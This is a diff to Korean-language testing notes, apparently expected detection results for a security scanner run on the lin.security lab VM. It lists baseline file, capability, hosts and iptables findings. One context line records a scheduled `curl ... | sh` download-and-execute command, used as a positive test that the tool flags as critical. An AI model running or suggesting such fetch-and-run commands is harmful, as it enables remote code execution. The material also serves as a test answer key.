@@ -458,6 +458,15 @@ lin.security 권한 상승 경로: 1단계 6개 + 2-A에서 찾은 peter docker 
 
 양성: `echo 'curl -s http://127.0.0.1/a | sh' | at now + 1 hour` → PER-06 심각 "내려받아 바로 실행한다", 작업 파일 25행 — 일치. 이후 `original` 복원
 
+
+## 2-D 파일·명령 기록·설정 정답 (2026-11-06, `original`)
+
+- 임시 폴더 ELF 없음, immutable·append-only 없음, 명령 기록 파일 없음, 웹 서버 없음(/var/www·nginx·apache 로그 없음)
+- capability: /usr/bin/mtr-packet cap_net_raw+ep (패키지)
+- 시스템 영역 숨김 폴더: /tmp의 X 폴더 5개(.ICE-unix·.XIM-unix·.X11-unix·.font-unix·.Test-unix), /lib/modules/*/vdso/.build-id, /usr/src/linux-headers-*/.tmp_versions
+- /etc/hosts 기본(localhost.localdomain 형식), resolv.conf → resolved 스텁, resolved.conf 기본
+- iptables: Docker 체인(DOCKER·DOCKER-USER·DOCKER-ISOLATION-STAGE-1·2)과 docker0 대역 MASQUERADE뿐, DNAT·REDIRECT 없음. nft 미설치, /etc/iptables·nftables.conf 없음, ufw inactive
+
 ## 검증자 활동 (auth.log에 남는 기록)
 
 탐지 결과와 섞이지 않도록 따로 적는다.
